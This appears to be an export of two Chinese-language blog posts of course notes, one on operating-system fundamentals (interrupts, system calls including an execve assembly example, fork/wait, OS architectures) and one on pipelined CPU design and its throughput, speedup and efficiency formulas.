[{"content":"操作系统\r基本信息介绍\r操作系统信息\r在经典的五级结构划分中，计算机组成结构包含数字逻辑层、微体系结构层、指令集架构层、操作系统层、应用程序层。其中前三层属于\u0026quot;硬件层\u0026quot;，最后一层属于\u0026quot;软件层\u0026quot;。操作系统的地位就是硬件和软件之间的媒介。扮演资源分配器和控制程序的角色。 计算机系统的四个组成部分\r硬件(Hardware)：提供基本的计算资源 CPU、内存、I/O设备等 操作系统(Operating System)：控制和协调硬件在用户之间的使用 资源分配器：管理所有资源，决定冲突请求的处理以实现高效和公平的资源共享 控制程序：控制程序执行以防止错误和系统的不当使用 应用程序(Application Programs)：使用系统资源解决计算问题 如文字处理器、编译器、Web浏览器等 用户(Users)： 人、机器、其他计算机等 操作系统定义与视角\r用户视角 vs 系统视角\r用户视角： 用户需要便利性和易用性 不太关心资源利用率 共享计算机（如主机）必须让所有用户满意 手持设备资源受限，优化可用性和电池寿命 系统视角： 操作系统是资源分配器 操作系统是控制程序 操作系统定义\r近似定义：\u0026ldquo;当你订购操作系统时，供应商提供的所有东西\u0026rdquo; 没有普遍接受的定义 供应商提供的内容可能差异很大 内核(Kernel)：\u0026ldquo;始终在计算机上运行的一个程序\u0026rdquo; 其他都是系统程序或应用程序 操作系统在不同上下文中可能有不同含义 计算机系统组成\r硬件组件\r基本结构\rCPU和设备控制器通过总线连接共享内存 CPU和设备并发执行，竞争内存周期 设备控制器\r每个设备控制器负责特定类型的设备 磁盘控制器、USB控制器等 每个设备控制器都有本地缓冲区 I/O过程：在设备和控制器本地缓冲区之间进行 CPU在主内存和控制器缓冲区之间移动数据 I/O设备和CPU可以并发执行 直接内存访问(DMA)\r用途：用于能够以接近内存速度传输信息的高速I/O设备 如以太网、硬盘、CD-ROM等 工作流程： 设备驱动程序向控制器发送I/O描述符 I/O描述符包含：操作类型、内存地址等 控制器在其本地缓冲区和主内存之间传输数据块，无需CPU干预 整个I/O请求完成时只产生一个中断 中断与陷阱\r中断与陷阱讲解\r中断（Interrupt）\r定义：中断是由外部硬件设备产生的异步事件，用来通知CPU某个事件已经发生 特点： 异步发生：不可预知的时间点 由外部硬件触发（如键盘输入、鼠标点击、网络数据到达等） CPU可以选择性地响应或屏蔽某些中断 类型： 硬件中断：由硬件设备产生（如定时器中断、I/O完成中断） 软件中断：由软件指令产生（如系统调用） 处理流程： 硬件检测到中断信号 CPU完成当前指令执行 保存当前程序状态（寄存器、程序计数器等） 跳转到中断服务程序（ISR） 执行中断处理 恢复被中断程序的状态 继续执行被中断的程序 陷阱（Trap）\r定义：陷阱是由正在执行的程序内部产生的同步事件 特点： 同步发生：在特定指令执行时产生 由当前执行的程序触发 通常用于系统调用和异常处理 类型： 系统调用陷阱：用户程序请求操作系统服务 异常陷阱：程序执行错误（如除零错误、非法内存访问等） 调试陷阱：用于程序调试（如断点） 处理流程： 程序执行特定指令（如系统调用指令） CPU立即响应陷阱 切换到内核模式 跳转到相应的陷阱处理程序 执行系统服务或异常处理 返回用户模式（如果适用） 继续执行程序 中断与陷阱的区别\r触发源 中断：外部硬件设备 陷阱：程序内部指令 时机 中断：异步，不可预测 陷阱：同步，可预测 用途 中断：处理外部事件，提高系统响应性 陷阱：实现系统调用，处理程序异常 可屏蔽性 中断：部分可屏蔽 陷阱：通常不可屏蔽 重要性\r提高系统效率：避免CPU空等，实现并发处理 实现系统调用：用户程序与内核通信的桥梁 错误处理：及时处理程序运行时错误 实时响应：确保系统能够及时响应外部事件 操作系统对中断的处理\r中断处理机制\r中断向量表(Interrupt Vector Table) 存储中断服务程序入口地址的表格 每个中断类型对应一个终端号和处理程序地址 通常位于内存的固定位置 中断优先级 可屏蔽中断(Maskable Interrupt)：可以被CPU忽略或延迟处理 不可屏蔽中断(Non-Maskable Interrupt, NMI)：必须立即处理的紧急中断 优先级排序：高优先级中断可以打断低优先级中断的处理 中断处理步骤\r中断识别 硬件产生中断信号 CUPU在每个指令周期结束时检查中断请求 确定中断源和中断类型】 现场保护 自动保存：CPU自动保存程序状态字 手动保存：中断服务程序保存其他寄存器内容 保存到内核栈或进程控制块 中断分发 根据中断号查找中断向量表 跳转到对应的中断服务程序(ISR) 切换到内核模式（如果尚未切换） 中断处理 执行具体的中断服务代码 处理硬件设备的请求 现场恢复 恢复之前保存的寄存器内容 恢复程序状态字和程序计数器 返回被中断的程序继续执行 中断处理策略\r立即处理（Immediate Processing）\n中断发生时立即处理 适用于紧急和高优先级中断 可能影响系统响应时间 延迟处理（Deferred Processing）\n将中断处理分为上半部和下半部 上半部：快速处理紧急部分，清除中断源 下半部：延后处理耗时的非紧急部分 Linux中的软中断（softirq）和工作队列（workqueue） 中断合并（Interrupt Coalescing）\n将多个相同类型的中断合并处理 减少中断处理开销 提高系统吞吐量 中断控制器\r可编程中断控制器（PIC）\n管理多个中断源 设置中断优先级 屏蔽特定中断 高级可编程中断控制器（APIC）\n支持多处理器系统 提供更灵活的中断路由 支持中断重定向和负载均衡 现代操作系统的优化\r中断线程化\n将中断处理程序作为内核线程运行 提高系统的实时性和可预测性 便于调试和性能分析 中断亲和性（Interrupt Affinity）\n将特定中断绑定到特定CPU核心 提高缓存利用率和性能 减少处理器间通信开销 动态中断分配\n根据系统负载动态调整中断处理 实现负载均衡 适应不同的工作负载模式 I/O\rI/O基本介绍\r从系统调用到设备的I/O过程\r系统调用访问：程序使用系统调用访问系统资源 如文件、网络等 设备访问转换：操作系统将其转换为设备访问并发出I/O请求 I/O请求传输：I/O请求发送到设备驱动程序，然后到控制器 如读取磁盘块、发送/接收数据包等 等待处理： 同步I/O：OS让程序等待 异步I/O：OS不等待直接返回给程序 进程切换：当请求者等待时，OS可能切换到另一个程序 I/O完成：I/O完成后控制器中断OS 处理结果： 同步I/O：OS处理I/O然后唤醒程序 异步I/O：OS发送信号给程序 中断驱动的I/O循环\r操作系统通常是中断驱动的 中断传输控制到中断服务程序 中断向量：包含所有服务程序地址的表格 在服务另一个中断时，传入的中断被禁用以防止中断丢失 中断处理程序必须保存（被中断的）执行状态 中断处理详细流程\r中断识别： 硬件产生中断信号 CPU在每个指令周期结束时检查中断请求 确定中断源和中断类型 现场保护： 操作系统保存CPU的执行状态 保存寄存器和程序计数器(PC) 中断分发： OS确定哪个设备造成了中断 轮询(Polling)或向量中断系统 中断处理： OS通过调用设备驱动程序处理中断 现场恢复： OS将CPU执行恢复到保存的状态 存储结构\r存储层次结构\r主存储器\r主内存：CPU能够直接访问的唯一大容量存储 随机访问，通常是易失性的 辅助存储：大容量非易失性存储 磁盘是最常见的辅助存储设备(HDD) 由覆盖磁性记录材料的刚性金属或玻璃盘片组成 磁盘表面逻辑上分为磁道和扇区 磁盘控制器决定OS和设备之间的交互 存储系统层次结构\r存储系统可以按层次组织，考虑以下因素：\n速度(Speed) 成本(Cost) 易失性(Volatility) 存储性能层次（从快到慢）：\nCPU寄存器 CPU缓存(L1/L2/L3) 主内存(RAM) 辅助存储(SSD/HDD) 光学存储/磁带 缓存\r缓存基本概念\r缓存原理\r缓存：将信息复制到更快存储系统中 主内存可以看作是辅助存储的缓存 CPU缓存是主内存的缓存 缓存是在多个级别执行的重要原理 硬件、操作系统、用户程序等 缓存工作机制\r数据复制：使用中的数据从较慢存储临时复制到较快存储 缓存检查：首先检查较快存储(缓存)以确定数据是否存在 缓存命中：如果在缓存中，直接从缓存使用数据(快速) 缓存未命中：如果不在缓存中，先将数据复制到缓存然后使用 缓存特点：缓存通常比被缓存的存储小 缓存管理\r缓存管理是重要的设计问题 缓存大小 替换策略 多任务环境必须小心使用最新值，无论它存储在存储层次的哪里 多处理器环境必须在硬件中提供缓存一致性，确保所有CPU在其缓存中都有最新值 虚拟缓存 vs 物理缓存\r虚拟缓存：使用虚拟地址进行缓存 物理缓存：使用物理地址进行缓存 缓存一致性：多处理器必须保证缓存一致性 计算机系统架构\r系统分类\r根据通用处理器数量分类：\n单处理器系统 多处理器系统 单处理器系统\r大多数老系统只有一个通用处理器 如智能手机、PC、服务器、主机 大多数系统也有专用处理器 多处理器系统\r基本特征\r别名：并行系统、紧耦合系统 优势： 增加吞吐量 规模经济 增加可靠性：优雅降级或容错 多处理器类型\r非对称多处理(Asymmetric Multiprocessing) 对称多处理(SMP, Symmetric Multiprocessing) 多核设计\r多核 vs 超线程\r多核：单个芯片中多个CPU核心 超线程：两个程序可以同时使用一个执行单元(在一个核心内) 性能依赖：操作系统、编译器、应用程序 NUMA架构\r非统一内存访问系统(Non-Uniform Memory Access) 本地内存访问快速，可扩展性好 集群系统\r多个系统通过高速网络协同工作 通常通过**存储区域网络(SAN)**共享存储 高可用性服务，可以在故障中生存 非对称集群：一台机器处于热备用模式 对称集群：多个节点运行应用程序，相互监控 高性能计算(HPC)：应用程序必须编写以使用并行化 分布式系统\r独立系统集合，可能是异构的，通过网络互连 网络OS允许系统交换消息 分布式系统创建单一系统的错觉 特殊用途系统\r实时嵌入式系统\r最普遍的计算机形式 变化很大 使用特殊用途(有限用途)实时OS 多媒体系统\r数据流必须根据时间限制传送 手持系统\r如PDA、智能手机 CPU、内存和电源有限 过去使用功能简化的OS 点对点计算\r分布式系统的另一种模型 P2P不区分客户端和服务器 所有节点都被视为对等体 可以充当客户端、服务器或两者 节点必须加入P2P网络： 向中央查找服务注册其服务，或 通过发现协议广播请求和响应服务 示例：BitTorrent、Napster、Gnutella和区块链平台 操作系统操作\r多道程序设计(Multiprogramming)\r基本概念\r多道程序设计对于效率是必要的 单个用户无法始终保持CPU和I/O设备忙碌 用户的计算任务被组织为作业(代码和数据) 工作机制\r作业调度：内核调度作业，使CPU始终有事可做 内存管理：系统中作业的子集保存在内存中 作业切换：当作业必须等待(如I/O)时，内核切换到另一个作业 多任务(Multitasking)\r时间共享概念\r**时间共享(多任务)**扩展了多道程序设计 OS频繁切换作业，用户可以与每个正在运行的作业交互 响应时间应该\u0026lt; 1秒 特征\r每个用户至少有一个程序在内存中执行(进程) CPU调度：如果几个作业同时准备运行 虚拟/物理内存：使程序员更容易 双模式操作\r基本概念\r操作系统通常是中断驱动的 效率，重新获得控制(定时器中断) 双模式操作允许OS保护自身和其他系统组件 模式类型\r用户模式和内核模式(或其他名称) 模式位区分CPU是在运行用户代码还是内核代码 特权指令：一些指令被指定为特权的，只能在内核中执行 系统调用：将模式改为内核，从调用返回将其重置为用户 模式间转换\r系统调用、异常、中断导致内核/用户模式之间的转换 定时器(Timer)\r防止无限循环或进程占用资源 启用定时器：设置硬件在某个时间段后中断 OS设置定时器：在调度进程之前设置定时器以重新获得控制 调度定时器：通常是周期性的(如250Hz) 无滴答内核：按需定时器中断(Linux) 资源管理\r进程管理\r进程基本概念\r进程是正在执行的程序 程序是被动实体，进程是活动实体 系统有许多进程并发运行 从程序到进程\r程序：存储在磁盘上的被动代码 进程：程序装载到内存后的活动实体 进程需要资源来完成其任务： CPU、内存、I/O、文件、初始化数据等 资源回收：进程终止时，OS回收所有可重用资源 进程管理活动\r进程创建和终止 进程挂起和恢复 进程同步原语 进程通信原语 死锁处理 从进程到线程\r单线程进程有一个程序计数器 程序计数器指定下一条要执行的指令的位置 处理器按顺序执行指令，一次一条，直到完成 多线程进程每个线程有一个程序计数器 线程的好处： 创建开销小 上下文切换快 共享内存空间 并发执行 内存管理\r内存管理基本概念\r内存是CPU可直接访问的主要存储 数据处理前后都需要保存在内存中 所有指令都应该在内存中才能执行 内存管理目标\r优化CPU利用率和响应时间 为程序员提供虚拟内存视图 内存管理活动\r跟踪内存的哪些部分正在被使用以及被谁使用 决定哪些进程和数据移入和移出内存 分配和释放根据需要分配和释放内存空间 文件系统管理\r文件系统基本概念\rOS提供统一的逻辑数据存储视图 文件是抽象物理属性的逻辑存储单元 文件通常组织到目录中 访问控制决定谁可以访问文件 文件系统管理活动\r创建和删除文件和目录 操作原语来操作文件和目录 映射文件到辅助存储 备份文件到稳定(非易失性)存储介质 大容量存储管理\r基本概念\r磁盘子系统管理大容量存储 磁盘用于存储： 不适合主内存的数据 必须保存\u0026quot;长\u0026quot;时间的数据 整个系统速度取决于磁盘子系统及其算法 某些存储不需要快速(如光存储或磁带) 大容量存储管理活动\r空闲空间管理 存储分配 磁盘调度 数据迁移通过存储层\r系统必须使用最新值，无论它存储在哪里 多级数据一致性： 多处理器的缓存一致性(缓存窥探)：由硬件实现 所有CPU在其缓存中都有最新值 多进程或多线程的同步 分布式环境情况更复杂 一个数据可能存在多个副本：如何同步更改？ I/O系统管理\rI/O子系统职责\rI/O子系统向用户隐藏硬件设备的特性 I/O子系统负责： 管理I/O内存 缓冲：在数据传输时临时存储数据 缓存：在更快存储中存储数据部分以提高性能 假脱机：一个作业的输出与其他作业的输入重叠 设备驱动程序接口\rOS可能提供通用设备驱动程序接口 优点：对程序员好：面向对象设计模式 缺点：从安全角度看：大量使用函数指针 操作系统设计原则\r策略与机制分离\r基本概念\r机制(Mechanism)：关于系统\u0026quot;如何\u0026quot;的问题 操作系统如何执行上下文切换 策略(Policy)：\u0026ldquo;哪个\u0026quot;问题 应该切换到哪个进程 其他示例\r机制示例： 如何分配内存 如何调度CPU 如何处理中断 策略示例： 哪个进程获得内存 哪个进程优先运行 哪个中断优先处理 优势与劣势\r优势： 灵活性：可以更改策略而不改变机制 模块化：清晰的分层设计 可维护性：更容易理解和修改 劣势： 性能开销：额外的抽象层 复杂性：需要更仔细的设计 虚拟化\r虚拟化概念\r抽象单个计算机的硬件(CPU/内存/IO等)到不同环境 虚拟机：提供与底层硬件相同接口的软件 好处： 资源共享 隔离性 可移植性 易于管理 虚拟化类型\r完全虚拟化：完全模拟硬件 半虚拟化：修改客户OS以与虚拟机监控器协作 硬件辅助虚拟化：硬件支持虚拟化 抽象\r抽象的重要性\r抽象是我们在计算机科学中所做的一切的基础\n抽象使以下成为可能：\n编写大型程序：将其分为小而可理解的片段 使用高级语言：如C语言编写而不考虑汇编 汇编编程：而不考虑逻辑门 构建处理器：使用门而不过多考虑晶体管 抽象层次\r应用程序层：用户程序 高级语言层：C/C++/Java等 汇编语言层：汇编指令 指令集架构层：机器指令 微架构层：CPU内部实现 逻辑门层：数字逻辑 晶体管层：物理实现 操作系统框架\r操作系统服务组成\r用户可见服务 用户界面(UI) 包括：CLI(Command-Line, 命令行), GUI(Graphic User Line, 图形化用户界面), batch 程序运行 I/O操作 文件系统操作 通信 错误检测 系统可见服务 资源分配 包括：CPU调度，内存分配和管理，I/O设备分配 系统保护 会计统计 系统调用(System Call)\r定义\r系统调用指的是访问操作系统服务的编程接口 示例\rLinux的复制指令 1 cp in.txt out.txt 就是一个调用系统调用 调用\r一般一个系统调用被与一个数字联系起来，这个数字被称为系统调用号(System Call Number) 例如Linux中read()可能是编号0，write()可能是编号1 系统调用接口表 系统调用接口维护着一个表格，这个表格被这些编号索引，表格中存储着对应系统调用处理函数的地址，类似于您文档中提到的中断向量表观念 Linux系统调用数量示例 Linux有大约340个系统调用，不同架构的系统调用数量略有差异。x86架构有349个系统调用，而ARM架构有345个 系统调用的核心原理\r内核执行系统调用并返回结果 用户程序无需了解系统调用细节 用户只需使用API并理解其功能 API隐藏操作系统接口的大部分细节 系统调用传参\r寄存器法\r工作原理 参数直接存储在CPU寄存器中 系统调用时，内核直接从寄存器读取参数 优势 速度最快 实现简单 开销最小 劣势 参数数量首先 不适合复杂调用 内存块法 工作原理 参数存储在内存块（或表）中 内存块的地址作为参数传递给寄存器 内核通过地址访问内存块获取所有参数 优势 参数数量不受限制：内存块可以很大 适合复杂数据结构：可以传递结构体、数组等 组织性好：参数集中管理 劣势 需要额外内存访问 实现稍复杂 栈法 工作原理 参数被程序推入栈中 操作系统从栈中弹出参数 利用栈的后进先出特性 优势 参数数量不受限制 自然的调用约定 易于实现 劣势 栈操作开销 栈空间管理 Linux/x86架构下execve系统调用的实现\r存储系统调用信号到eax寄存器 参数存储到指定寄存器 执行系统调用指令 完整汇编代码如下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 section .data filename db \u0026#39;/bin/ls\u0026#39;, 0 arg1 db \u0026#39;ls\u0026#39;, 0 arg2 db \u0026#39;-l\u0026#39;, 0 argv dd filename, arg1, arg2, 0 envp dd 0 section .text global _start _start: mov eax, 11 mov ebx, filename mov ecx, argv mov edx, envp int 0x80 mov eax, 1 mov ebx, -1 int 0x80 系统调用列举\r进程控制 Types of System Calls Process control create process, terminate process end, abort load, execute get process attributes, set process attributes wait for time wait event, signal event allocate and free memory Dump memory if error Debugger for determining bugs, single step execution Locks for managing access to shared data between processes 文件管理 create file, delete file open, close file read, write, reposition get and set file attributes 设备管理 request device, release device read, write, reposition get device attributes, set device attributes logically attach or detach devices can be combined with file management system call 信息维护 get time or date, set time or date get system data, set system data get and set process, file, or device attributes 通信 create, delete communication connection send, receive messages: message passing model to host name or process name From client to server Shared-memory model create and gain access to memory regions transfer status information attach and detach remote devices 保护 Control access to resources Get and set permissions Allow and deny user access 应用程序接口(Application Programming Interface, API)\r定义：\r应用程序编程接口，是预先定义的函数/集合的集合 常用的API\rWin32： Windows POSIX： UNIX, Linux Java: Java虚拟机 链接器(Linker)与加载器(Loader)\r基本概念\r链接器\r功能：将目标文件转换为可执行文件 作用：解决符号引用，合并代码段和数据段、 时机：编译时或程序启动时 加载器\r功能：将程序转换为进程 作用：将可执行文件加载到内存并启动执行 时机：程序执行时 工作方式和内容\r编译链接过程\r链接类型对比\r静态链接 特点 链接时机：编译时完成所有链接 文件大小：较大，包含所有依赖库 运行依赖：无外部依赖，独立运行 优点 运行时无依赖 加载速度快 部署简单 缺点 文件体积大 内存占用多 库更新需要重新编译 动态链接 特点 链接时机：运行时动态链接 文件大小：较小，只包含引用信息 运行依赖：需要动态链接库(DLL/SO) 优点： 文件体积小 内存共享 库更新无需重新编译 节省磁盘空间 缺点： 运行时有依赖 加载稍慢 部署复杂 注：延迟绑定(Lazy Binding) 概念 定义：动态链接库中的函数在第一次调用时才进行地址解析 目的：减少程序启动时间，只解析实际使用的函数 操作系统架构\r已有的操作系统架构\rMS-DOS\r架构特点：简单的单体结构 特征： 应用程序可以直接访问硬件 没有明确的用户模式和内核模式分离 程序运行在单一地址空间 优点： 系统开销小 执行效率高 实现简单 缺点： 系统不稳定，一个程序崩溃可能导致整个系统崩溃 安全性差 不支持多任务 Original-UNIX\r架构特点：经典的分层单体内核 特征： 内核和用户程序分离 系统调用作为内核和用户程序的接口 \u0026ldquo;一切皆文件\u0026quot;的设计理念 优点： 简洁而强大的设计 良好的可移植性 多用户多任务支持 缺点： 内核代码耦合度高 难以扩展和维护 单体内核的性能瓶颈 分层方法(Layered Approach)\r基本概念： 操作系统被划分为多个层次(levels) 每一层都建立在较低层之上 最底层(第0层)是硬件，最高层(第N层)是用户界面 每一层只使用较低层的函数和服务 THE操作系统分层示例： 1 2 3 4 5 6 第5层: 用户程序 第4层: 输入/输出管理 第3层: 操作员-进程通信 第2层: 内存管理 第1层: 进程调度 第0层: 硬件 优点： 模块化设计，便于调试和维护 层次清晰，易于理解 易于验证系统正确性 缺点： 性能开销大(多层调用) 层次划分困难 严格分层限制系统灵活性 微内核方法(Microkernel Approach)\r基本概念： 将尽可能多的功能从内核移到用户空间 内核只保留最基本的功能 其他系统服务作为用户级进程运行 微内核核心功能： 进程间通信(IPC) 基本进程管理 低级内存管理 基本I/O和中断管理 用户空间服务： 文件系统服务器 网络协议栈 设备驱动程序 虚拟内存管理器 优点： 系统稳定性高(服务崩溃不影响内核) 安全性好(服务运行在隔离的地址空间) 易于扩展和维护 支持分布式系统 缺点： IPC开销大，性能较低 系统调用开销增加 设计和实现复杂 模块化方法(Modular Approach)\r基本概念： 结合单体内核和微内核的优点 内核提供核心服务 其他功能通过可装载模块实现 特征： 模块可以动态加载和卸载 模块运行在内核空间 通过定义良好的接口通信 Linux模块示例： 文件系统模块(ext4, ntfs) 网络协议模块(TCP/IP) 设备驱动模块 优点： 灵活性高 内存使用效率高 易于维护和扩展 性能好(避免用户空间切换) 缺点： 模块错误可能影响整个内核 接口设计需要谨慎 依赖关系管理复杂 混合系统架构\r基本概念： 结合多种架构方法的优点 针对不同功能采用最适合的架构 现代操作系统实例： Windows NT：混合微内核架构 内核模式：HAL、内核、执行体 用户模式：子系统、应用程序 macOS：基于Mach微内核的混合架构 Mach微内核 + BSD层 + I/O Kit Linux：模块化单体内核 单体内核 + 可装载模块 系统调用实例\r进程管理系统调用示例\rfork系统调用\r基本概念：创建新进程的方式 特殊之处： 新创建的进程是调用进程的完全副本 返回两次：在父进程和子进程中分别返回 新进程拥有自己的内存地址空间 返回值： 在父进程中：返回子进程的PID 在子进程中：返回0 出错时：返回-1 fork + wait组合\rwait系统调用：父进程等待子进程执行完毕 用途： 避免僵尸进程 获取子进程退出状态 进程同步控制 典型使用模式： 1 2 3 4 5 6 7 8 pid_t pid = fork(); if (pid == 0) { // 子进程代码 exit(0); } else if (pid \u0026gt; 0) { // 父进程代码 wait(NULL); // 等待子进程结束 } fork + wait + exec组合\rexec系统调用特点： 用于运行与调用程序不同的程序 exec永不返回(成功时) 完全替换当前进程映像 为什么分离fork和exec： 构建UNIX shell的基础 允许在fork后、exec前进行特殊操作 提供更大的灵活性 Shell工作原理： Shell是一个用户程序 等待用户输入 执行命令：fork创建子进程 → exec加载新程序 → wait等待完成 分离设计使shell功能更强大 调试相关系统调用\rptrace系统调用\r基本概念：进程追踪系统调用 主要功能： 一个进程可以控制另一个进程的执行 检查和修改被追踪进程的内存和寄存器 实现断点调试功能 应用场景： 调试器实现：gdb、strace等工具的基础 进程监控和分析 安全分析工具 调试器(Debugger)工作原理\r定义：用于测试和调试其他程序的计算机程序 基本操作： 附加到进程(Attaching to a process) 基本控制(Basic Control)：暂停、继续、单步执行 设置断点(Setting a breakpoint) 命中断点(Hitting a breakpoint) ptrace在调试中的应用： 通过ptrace系统调用实现进程控制 监控被调试程序的每个系统调用 提供程序执行状态的实时查看 系统调用实践要点\r进程创建模式：fork + exec是UNIX系统进程创建的标准模式 Shell实现：所有UNIX shell都基于fork/exec/wait三个系统调用 调试工具：现代调试器和追踪工具都依赖ptrace系统调用 手册参考：使用man page查看详细的系统调用文档和使用方法 ","date":"2025-07-30T21:40:00+08:00","permalink":"https://example.com/p/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"操作系统"},{"content":"流水线CPU\r流水线核心概念\r理念\r将指令执行划分为多个时间均衡的子阶段，使得多条不同指令再不同阶段并行处理 处理方式\r可以想象一下，假设在洗衣时，需要经过洗涤（30min）$\\rightarrow$ 烘干 （40min）$\\rightarrow$ 折叠（20min），现在有4人需要洗衣服务，如果全部依次处理（单周期CPU），那么耗时是6h，即处理每个人的服务需要90min（1.5h），依次执行，共计耗时6h。如果使用流水线处理，可以在执行上一个人的烘干任务时执行下一个人的洗涤任务。 可以看到通过通过流水线处理将总耗时缩减到了3.5h 与洗衣类似，指令执行也可以分为三个阶段IF(Instucction Fetch), ID(Instruction Decode), Ex(Execution) 在串行处理中，与上面的洗衣类似，下一条指令在上一个指令的三个阶段全部结束后才开始 此时的运行时间为$6Δt$ (这里为了方便演示，假设各个阶段的处理时间相同) 可以发现与洗衣类似，后一条指令并不需要等待前一条执行完毕，而是只需要对应的模块”空出来“就可以执行 此时的运行时间为$5Δt$ 可以发现运行时间可以被进一步缩短，即增加重叠部分 此时的运行时间为$4Δt$ 以上两种重叠方式分别被称为 单重叠(Single overlapping) 和 双重叠(Twice overlapping) 重叠方式比较\r单重叠\r优点 相较串行运行时间缩短近$\\frac{1}{3}$（对大量指令） 功能单元利用率显著提升 缺点 需要额外硬件支持 控制过程复杂化 双重叠\r优点 相较串行运行时间缩短近$\\frac{2}{3}$（对大量指令） 功能单元利用率进一步显著提升 缺点 需要大量额外硬件支持 需要物理分离的fetch, decode和execution单元 注： 双重叠面临的问题和需要的硬件支持\r核心问题：内存访问冲突\r在双重叠中如果多条指令同时访问内存，会引发冲突 冲突场景： 实践场景：双重叠还原为单重叠\r上面的讲解都是基于三个阶段耗时相等的假设的，但是在实际CPU场景中，三个阶段的运行时间并不相等，一般IF阶段耗时最少，如果IF阶段耗时很短可以忽略，那么双重叠在优化上就约等与单重叠了 阶段不等长——重叠中的资源浪费和冲突问题\r在考虑到应用场景中各阶段不等长后，可以进一步考虑潜在的问题 如果ID \u0026lt; EX 可以看到此时一条指令的EX阶段在时间上与下一条指令的EX阶段发生了重叠，这被称之为资源冲突 如果ID \u0026gt; EX 可以看到此时的时间轴上存在未执行指令的部分，这被称为资源浪费 注：为什么是这种执行方式？ 所有流水线阶段在同一时钟边沿同步推进，即IF始终是在每个时钟周期开始时触发的。ID \u0026gt; EX的情况下的实际过程是IF(K+1)在执行完毕后等待到ID(K)执行完毕，开启下一个时钟周期才开始执行ID(K+1)和IF(K+2)。这个现象被称为阻塞(Block) 流水线概念\r核心解释\r指令分解：将单条指令的执行划分成m个子阶段，要求m\u0026gt;5。经典设计为五级流水线。m被称为流水线深度 时间均等：要求每个子阶段耗时严格相等($Δt_{stage}$)，由全局时钟周期$T_c$统一控制。若阶段耗时不等，以最慢阶段为基准设定($T_c$) 错位重叠：m条相邻指令在同一时间并行处理不同阶段 重叠方式参考上面的双重叠，实现全阶段并行 特征\r结构特征\r阶段划分：每阶段由专属功能单元实现（如IF/ID/EX） 时间均衡：最长阶段决定整体速度 这是流水线高效运行的关键，如果某个阶段时间比其他阶段长，这个阶段就会成为瓶颈(Bottleneck)，如上面所演示的那样导致阻塞 流水线寄存器：缓存阶段见数据，隔离各阶段操作 传递数据：在时钟边沿将前一个阶段在本时钟周期内处理完成的结果捕获并储存起来 数据保持：在下一个时钟周期这个数据会被提供给下一个阶段作为输入，确保数据在正确的时间被后续阶段使用 阶段隔离：当前一个阶段在下一个时钟周期开始处理新任务时，后一个阶段使用的是寄存器中保存的、前一个阶段上一个周期的结果。没有这些寄存器，前一阶段的新输出会立即冲掉后一阶段还在处理的输入，导致数据混乱和错误。 它确保了每个阶段在一个时钟周期内可以独立地处理分配给它的那份工作（数据）。 适用场景：大量重复的顺序工作\r大量：从上面的示例可以发现，在不考虑“开头”和“结尾”的情况下，当m=3时，运行时间应当是串行时间的$\\frac{1}{3}$.但实际可以看到，存在开头和结尾的额外开销，这被称为流水线启动和排空，在稍后会涉及。同时不难发现，当处理条数更多时，运行时间更接近$\\frac{1}{3}$，即-处理大量的指令时节省的时间可以稀释启动和排空开销 重复：任务的执行流程（分解成的阶段）是相似的。上面的演示中的阶段都是完全相同的，就是一种理想状态 顺序：任务见最好是顺序执行的，或相关性较低。如果任务间有较强的依赖性就容易导致阻塞 持续输入：保持流水线处于忙碌状态，避免空闲导致效率下降 时间参数：启动时间与排空时间\r启动时间/首次延迟：从第一个任务进入流水线到离开的总时间 排空时间/排空延迟：从最后一个任务进入到所有流水线任务结束的总时间 流水线分类\r按功能划分\r单功能流水线 多功能流水线 按照并行性划分（针对多功能流水线）\r静态流水线：多功能，但不支持混合任务。即同一时间段内智能固定配置为一种任务。切换任务需要排空当前流水线 动态流水线：支持混合任务 注：可以用咖啡机来做比喻。单功能流水线就是一台只能做美式咖啡的咖啡机。静态流水线可以做多种咖啡，但是每次切换口味需要清空管道。动态流水线可以同时制作多种咖啡。 按照运行顺序划分\r顺序流水线：任务的流出和流入顺序相同，上面的演示都是顺序流水线 乱序流水线：任务的流出和流入顺序可以不同，允许先完成后面的任务 按硬件划分\r部件级流水线/操作流水线：将处理器的算术逻辑运算部件（ALU）分段，使得各种类型的运算可以通过流水线方式执行。这是CPU内部针对单个复杂功能单元的流水化。例如，一个浮点乘法器可以被分成多个阶段（阶码处理、尾数处理、规格化等），从而让多个浮点乘法操作在内部重叠执行，提高该部件的吞吐率。 处理器级流水线/指令流水线：指令的解释和执行通过流水线实现。一条指令的执行过程被分成若干个子过程，每个子过程在一个独立的功能单元中执行。上面的演示都是指令流水线。RISC五级流水线就是一种指令流水线设计。 处理器间流水线/宏流水线：两个或更多处理器的连接，用于处理同一个数据流，每个处理器完成整个任务的一部分。常用于高性能计算或流处理系统 按照线性性划分\r线性流水线：各阶段串行连接，没有反馈回路。数据每个阶段中在每个段最多流过一次 非线性流水线：存在反馈回路，允许数据流回前面的阶段再次处理 基于RISC-V的流水线CPU\rRISC-V的流水线友好设计\r所有指令都是32位 精简和规整的指令格式 Load/Store架构 内存操作数强制对齐 流水线吞吐量\r公式定义 $$TP = \\frac{n}{T}$$ n: 处理的指令总数（任务数量） T: 完成任务的总时间 物理意义：单位时间内完成的指令数 性能上限约束 $$TP \u003c TP_{max}$$ 含义：实际吞吐量永远低于理论极限值 实际运行时间 $$ T = (m+n-1) \\times Δt_0 \\newline\rTP = \\frac{n}{T} = \\frac{n}{(m+n-1) \\times Δt_0}\\newline\rTP_{max} = \\frac{1}{Δt_0}\r$$ 可以发现当$n \u0026raquo; m$时，有$TP \\approx TP_{max}$ 可以写成 $$ TP = \\frac{n}{n+m-1}TP_{max}$$ 应用场景下的流水线吞吐量\r如之前的演示所反映的，流水线在实际可能会遇到瓶颈问题。容易想到，这一问题可以通过将时钟周期设置为最慢阶段耗时来解决，但这并不能提高效率。为了实际提高效率有其他解法 解决方案 细分(Subdivision)：将最长的阶段拆分为多个子阶段，每段耗时$Δt$ 资源复制(Repetition)：每$Δt$可开始一个新任务。这一解决方案实质上是在S2的内部执行并行加速。 更多性能衡量指标——Sp与η\rSp(speed up) $$Sp = \\frac{n \\times m \\times Δt_0}{(m+n-1)Δt_0} = \\frac{n \\times m}{m + n -1}$$ Sp衡量的是流水线相较串行加快运行速度的程度，当$n\u0026raquo;m$，即输入数据很多时，有$Sp \\approx m$，逼近上确界 η(Efficiency) $$η = \\frac{Sp}{m} = \\frac{n}{m+n-1}$$ 